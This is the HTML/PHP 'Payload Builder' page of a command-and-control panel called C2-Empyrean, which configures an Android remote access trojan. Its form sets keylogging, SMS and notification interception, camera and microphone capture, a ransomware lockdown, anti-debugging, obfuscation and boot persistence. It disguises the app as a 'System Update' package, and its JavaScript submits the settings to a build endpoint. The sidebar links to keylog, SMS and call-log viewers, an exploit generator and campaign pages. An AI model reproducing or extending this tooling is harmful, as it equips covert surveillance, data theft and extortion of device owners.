<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payload Builder - C2-Empyrean</title>
    <link rel="stylesheet" href="/assets/css/dashboard.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            color: #e0e0e0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
        }
        .app-container { display: flex; min-height: 100vh; }
        .sidebar {
            width: 260px;
            background: rgba(255, 255, 255, 0.02);
            border-right: 1px solid rgba(255, 255, 255, 0.05);
            padding: 24px 16px;
            position: fixed;
            top: 0; left: 0;
            height: 100vh;
            overflow-y: auto;
            z-index: 100;
        }
        .sidebar-logo {
            font-size: 22px; font-weight: 800;
            background: linear-gradient(135deg, #00d4ff, #7b2ff7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 32px; padding: 0 12px;
        }
        .sidebar-nav { list-style: none; }
        .sidebar-nav li { margin-bottom: 4px; }
        .sidebar-nav a {
            display: flex; align-items: center; gap: 12px;
            padding: 10px 12px; color: rgba(255, 255, 255, 0.5);
            text-decoration: none; border-radius: 10px;
            font-size: 14px; font-weight: 500; transition: all 0.2s ease;
        }
        .sidebar-nav a:hover { background: rgba(255, 255, 255, 0.05); color: rgba(255, 255, 255, 0.8); }
        .sidebar-nav a.active { background: rgba(123, 47, 247, 0.15); color: #7b2ff7; }
        .sidebar-nav .icon { width: 20px; text-align: center; font-size: 16px; }
        .sidebar-divider { border: none; border-top: 1px solid rgba(255, 255, 255, 0.05); margin: 16px 12px; }
        .sidebar-section-title { color: rgba(255, 255, 255, 0.2); font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 1.5px; padding: 8px 12px; }

        .main-content {
            margin-left: 260px; flex: 1;
            padding: 28px 32px;
            max-width: calc(100vw - 260px);
        }
        .page-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 28px; }
        .page-title { font-size: 28px; font-weight: 700; color: #fff; }
        .page-title span { font-size: 14px; font-weight: 400; color: rgba(255, 255, 255, 0.3); }
        .header-actions { display: flex; gap: 12px; }
        .header-btn {
            padding: 8px 16px; background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px;
            color: rgba(255, 255, 255, 0.7); font-size: 13px;
            cursor: pointer; text-decoration: none; transition: all 0.2s;
        }
        .header-btn:hover { background: rgba(255, 255, 255, 0.1); color: #fff; }

        .builder-layout { max-width: 800px; }
        .builder-section {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 20px;
        }
        .section-title {
            font-size: 16px; font-weight: 600; color: #fff;
            margin-bottom: 20px; padding-bottom: 12px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }
        .form-group { margin-bottom: 14px; }
        .form-group label { display: block; font-size: 13px; color: rgba(255,255,255,0.5); margin-bottom: 6px; }
        .form-group input, .form-group select, .form-group textarea {
            width: 100%; padding: 10px 14px;
            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.08);
            border-radius: 8px; color: #fff; font-size: 13px; outline: none;
        }
        .form-group input:focus, .form-group select:focus, .form-group textarea:focus { border-color: #7b2ff7; }
        .form-group select option { background: #1a1a2e; }
        .form-group .help-text { font-size: 11px; color: rgba(255,255,255,0.2); margin-top: 4px; }

        .btn-build {
            padding: 14px 40px;
            background: linear-gradient(135deg, #7b2ff7, #00d4ff);
            border: none; border-radius: 8px; color: #fff;
            font-weight: 700; font-size: 15px; cursor: pointer; width: 100%;
        }
        .btn-build:hover { opacity: 0.9; }
        .btn-build:disabled { opacity: 0.4; cursor: not-allowed; }

        .toggle-row {
            display: flex; align-items: center; gap: 12px; padding: 8px 0;
        }
        .toggle-switch {
            position: relative; display: inline-block; width: 44px; height: 24px;
        }
        .toggle-switch input { opacity: 0; width: 0; height: 0; }
        .toggle-slider {
            position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(255,255,255,0.1); border-radius: 24px; transition: 0.3s;
        }
        .toggle-slider:before {
            content: ""; position: absolute; height: 18px; width: 18px;
            left: 3px; bottom: 3px; background: #fff; border-radius: 50%; transition: 0.3s;
        }
        .toggle-switch input:checked + .toggle-slider { background: #34c759; }
        .toggle-switch input:checked + .toggle-slider:before { transform: translateX(20px); }

        .build-status {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
            display: none;
        }
        .build-status.show { display: block; }
        .build-status .status-title { font-size: 16px; font-weight: 600; color: #fff; margin-bottom: 12px; }
        .build-status pre {
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            color: rgba(255,255,255,0.7);
            background: rgba(0,0,0,0.3);
            padding: 14px;
            border-radius: 8px;
            max-height: 300px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-all;
        }
        .build-status .download-link {
            display: inline-block;
            margin-top: 12px;
            padding: 10px 24px;
            background: rgba(52, 199, 89, 0.15);
            border: 1px solid rgba(52, 199, 89, 0.2);
            border-radius: 8px;
            color: #34c759;
            text-decoration: none;
            font-weight: 600;
        }
        .build-status .download-link:hover { background: rgba(52, 199, 89, 0.2); }

        .progress-bar {
            height: 4px;
            background: rgba(255,255,255,0.05);
            border-radius: 4px;
            margin: 12px 0;
            overflow: hidden;
        }
        .progress-bar .fill {
            height: 100%;
            background: linear-gradient(90deg, #7b2ff7, #00d4ff);
            border-radius: 4px;
            width: 0%;
            transition: width 0.3s;
        }

        @media (max-width: 768px) {
            .sidebar { display: none; }
            .main-content { margin-left: 0; max-width: 100%; padding: 20px; }
        }
    </style>
</head>
<body>
    <div class="app-container">
        <nav class="sidebar">
            <div class="sidebar-logo">C2-Empyrean</div>
            <div class="sidebar-section-title">Main</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/dashboard"><span class="icon">📊</span> Dashboard</a></li>
                <li><a href="/admin/devices"><span class="icon">📱</span> Devices</a></li>
                <li><a href="/admin/map_view"><span class="icon">🗺️</span> Map View</a></li>
                <li><a href="/admin/command_console"><span class="icon">⚡</span> Command Console</a></li>
                <li><a href="/admin/analytics"><span class="icon">📈</span> Analytics</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">Data</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/keylog_viewer"><span class="icon">⌨️</span> Keylogs</a></li>
                <li><a href="/admin/sms_console"><span class="icon">💬</span> SMS</a></li>
                <li><a href="/admin/call_logs"><span class="icon">📞</span> Call Logs</a></li>
                <li><a href="/admin/notification_viewer"><span class="icon">🔔</span> Notifications</a></li>
                <li><a href="/admin/file_browser"><span class="icon">📁</span> Files</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">Actions</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/exploit_generator"><span class="icon">🎣</span> Exploit Generator</a></li>
                <li><a href="/admin/campaign_manager"><span class="icon">📢</span> Campaigns</a></li>
                <li><a href="/admin/builder" class="active"><span class="icon">🔧</span> Builder</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">System</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/settings"><span class="icon">⚙️</span> Settings</a></li>
                <li><a href="/admin/telegram_settings"><span class="icon">🤖</span> Telegram</a></li>
            </ul>
        </nav>

        <main class="main-content">
            <div class="page-header">
                <h1 class="page-title">🔧 Payload Builder <span>custom RAT payload configuration</span></h1>
                <div class="header-actions">
                    <button class="header-btn" onclick="resetBuilder()">🔄 Reset</button>
                </div>
            </div>

            <div class="builder-layout">
                <div class="builder-section">
                    <div class="section-title">🎯 C2 Connection</div>
                    <div class="form-group">
                        <label>C2 Server URL</label>
                        <input type="text" id="c2Url" value="https://<?= htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'localhost') ?>" placeholder="https://your-panel.onrender.com">
                        <div class="help-text">The base URL where the panel is deployed. The RAT will poll this endpoint.</div>
                    </div>
                    <div class="form-group">
                        <label>Heartbeat Interval (seconds)</label>
                        <input type="number" id="hbInterval" value="30" min="5" max="300">
                        <div class="help-text">How often the RAT checks in. Lower = more responsive but more traffic.</div>
                    </div>
                    <div class="form-group">
                        <label>Device ID Prefix (optional)</label>
                        <input type="text" id="devicePrefix" placeholder="EMPYREAN-">
                        <div class="help-text">Prefix for auto-generated device IDs. Random suffix is appended.</div>
                    </div>
                </div>

                <div class="builder-section">
                    <div class="section-title">🔒 Encryption & Security</div>
                    <div class="form-group">
                        <label>AES Encryption Key</label>
                        <input type="text" id="aesKey" maxlength="64" placeholder="Auto-generate if empty">
                        <div class="help-text">64 hex characters (256-bit). Leave empty for auto-generation.</div>
                    </div>
                    <div class="form-group">
                        <label>Anti-Debugging</label>
                        <select id="antiDebug">
                            <option value="none">None</option>
                            <option value="basic">Basic (detect emulator)</option>
                            <option value="aggressive">Aggressive (detect root, debug, hooking)</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Obfuscation Level</label>
                        <select id="obfuscation">
                            <option value="none">None</option>
                            <option value="light">Light (rename variables)</option>
                            <option value="medium">Medium (string encryption + rename)</option>
                            <option value="heavy">Heavy (full control flow obfuscation)</option>
                        </select>
                    </div>
                </div>

                <div class="builder-section">
                    <div class="section-title">📡 Feature Toggles</div>
                    <div class="toggle-row">
                        <label class="toggle-switch"><input type="checkbox" id="featKeylog" checked><span class="toggle-slider"></span></label>
                        <span>Keylogging</span>
                    </div>
                    <div class="toggle-row">
                        <label class="toggle-switch"><input type="checkbox" id="featSms" checked><span class="toggle-slider"></span></label>
                        <span>SMS Intercept</span>
                    </div>
                    <div class="toggle-row">
                        <label class="toggle-switch"><input type="checkbox" id="featCallLogs" checked><span class="toggle-slider"></span></label>
                        <span>Call Logs</span>
                    </div>
                    <div class="toggle-row">
                        <label class="toggle-switch"><input type="checkbox" id="featContacts" checked><span class="toggle-slider"></span></label>
                        <span>Contacts</span>
                    </div>
                    <div class="toggle-row">
                        <label class="toggle-switch"><input type="checkbox" id="featLocation" checked><span class="toggle-slider"></span></label>
                        <span>GPS Location</span>
                    </div>
                    <div class="toggle-row">
                        <label class="toggle-switch"><input type="checkbox" id="featCamera" checked><span class="toggle-slider"></span></label>
                        <span>Camera Capture</span>
                    </div>
                    <div class="toggle-row">
                        <label class="toggle-switch"><input type="checkbox" id="featMic" checked><span class="toggle-slider"></span></label>
                        <span>Microphone Recording</span>
                    </div>
                    <div class="toggle-row">
                        <label class="toggle-switch"><input type="checkbox" id="featFileSystem" checked><span class="toggle-slider"></span></label>
                        <span>File System Access</span>
                    </div>
                    <div class="toggle-row">
                        <label class="toggle-switch"><input type="checkbox" id="featClipboard" checked><span class="toggle-slider"></span></label>
                        <span>Clipboard Monitoring</span>
                    </div>
                    <div class="toggle-row">
                        <label class="toggle-switch"><input type="checkbox" id="featNotifications" checked><span class="toggle-slider"></span></label>
                        <span>Notification Intercept</span>
                    </div>
                    <div class="toggle-row">
                        <label class="toggle-switch"><input type="checkbox" id="featLockdown" checked><span class="toggle-slider"></span></label>
                        <span>Lockdown / Ransomware</span>
                    </div>
                    <div class="toggle-row">
                        <label class="toggle-switch"><input type="checkbox" id="featSelfDestruct" checked><span class="toggle-slider"></span></label>
                        <span>Self-Destruct</span>
                    </div>
                </div>

                <div class="builder-section">
                    <div class="section-title">🎭 Evasion & Persistence</div>
                    <div class="form-group">
                        <label>Persistence Method</label>
                        <select id="persistence">
                            <option value="none">None</option>
                            <option value="boot_receiver" selected>Boot Receiver (auto-start)</option>
                            <option value="alarm_manager">Alarm Manager</option>
                            <option value="job_scheduler">Job Scheduler</option>
                            <option value="foreground_service">Foreground Service</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Icon & Package Spoof</label>
                        <input type="text" id="spoofPackage" value="com.android.system.update">
                        <div class="help-text">Package name to disguise as. Use common system package names.</div>
                    </div>
                    <div class="form-group">
                        <label>App Display Name</label>
                        <input type="text" id="appName" value="System Update">
                        <div class="help-text">Name shown in launcher and settings.</div>
                    </div>
                </div>

                <div class="builder-section">
                    <div class="section-title">📊 Build & Output</div>
                    <div class="form-group">
                        <label>Output Format</label>
                        <select id="outputFormat">
                            <option value="dex">DEX Bytecode</option>
                            <option value="smali">Smali Source</option>
                            <option value="zip">ZIP Archive (payload + resources)</option>
                        </select>
                    </div>
                    <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
                    <button class="btn-build" id="buildBtn" onclick="buildPayload()">🔨 Build Payload</button>
                </div>

                <div class="build-status" id="buildStatus">
                    <div class="status-title" id="buildStatusTitle">✅ Build Complete</div>
                    <pre id="buildOutput">Waiting for build...</pre>
                    <a href="#" class="download-link" id="downloadLink" style="display:none;">⬇️ Download Payload</a>
                </div>
            </div>
        </main>
    </div>

    <script>
        function resetBuilder() {
            document.getElementById('c2Url').value = 'https://' + window.location.host;
            document.getElementById('hbInterval').value = 30;
            document.getElementById('devicePrefix').value = '';
            document.getElementById('aesKey').value = '';
            document.getElementById('antiDebug').value = 'none';
            document.getElementById('obfuscation').value = 'none';
            document.getElementById('persistence').value = 'boot_receiver';
            document.getElementById('spoofPackage').value = 'com.android.system.update';
            document.getElementById('appName').value = 'System Update';
            document.getElementById('outputFormat').value = 'dex';
            document.querySelectorAll('.toggle-switch input').forEach(el => el.checked = true);
            document.getElementById('buildStatus').classList.remove('show');
            document.getElementById('progressFill').style.width = '0%';
            document.getElementById('buildBtn').disabled = false;
        }

        async function buildPayload() {
            const btn = document.getElementById('buildBtn');
            btn.disabled = true;
            btn.textContent = '⏳ Building...';
            const progress = document.getElementById('progressFill');
            progress.style.width = '30%';

            const features = {};
            document.querySelectorAll('.toggle-switch input').forEach(el => {
                features[el.id.replace('feat', '').toLowerCase()] = el.checked;
            });

            const data = {
                c2_url: document.getElementById('c2Url').value,
                heartbeat_interval: parseInt(document.getElementById('hbInterval').value),
                device_prefix: document.getElementById('devicePrefix').value,
                aes_key: document.getElementById('aesKey').value,
                anti_debug: document.getElementById('antiDebug').value,
                obfuscation: document.getElementById('obfuscation').value,
                persistence: document.getElementById('persistence').value,
                spoof_package: document.getElementById('spoofPackage').value,
                app_name: document.getElementById('appName').value,
                output_format: document.getElementById('outputFormat').value,
                features: features
            };

            progress.style.width = '60%';

            try {
                const r = await fetch('/api/builder/build', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + getCookie('access_token') },
                    body: JSON.stringify(data)
                });
                const result = await r.json();
                progress.style.width = '100%';

                const status = document.getElementById('buildStatus');
                status.classList.add('show');

                if (result.success) {
                    document.getElementById('buildStatusTitle').textContent = '✅ Build Complete';
                    document.getElementById('buildOutput').textContent = result.data.output || 'Payload built successfully.';
                    const dl = document.getElementById('downloadLink');
                    if (result.data.download_url) {
                        dl.href = result.data.download_url;
                        dl.style.display = 'inline-block';
                        dl.textContent = '⬇️ Download ' + (result.data.filename || 'payload');
                    } else {
                        dl.style.display = 'none';
                    }
                } else {
                    document.getElementById('buildStatusTitle').textContent = '❌ Build Failed';
                    document.getElementById('buildOutput').textContent = result.error || 'Unknown error';
                    document.getElementById('downloadLink').style.display = 'none';
                }
            } catch (err) {
                document.getElementById('buildStatus').classList.add('show');
                document.getElementById('buildStatusTitle').textContent = '❌ Build Error';
                document.getElementById('buildOutput').textContent = 'Connection error: ' + err.message;
                document.getElementById('downloadLink').style.display = 'none';
            }

            btn.disabled = false;
            btn.textContent = '🔨 Build Payload';
            setTimeout(() => progress.style.width = '0%', 2000);
        }

        function getCookie(name) {
            const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
            return match ? decodeURIComponent(match[2]) : null;
        }
    </script>
</body>
</html>
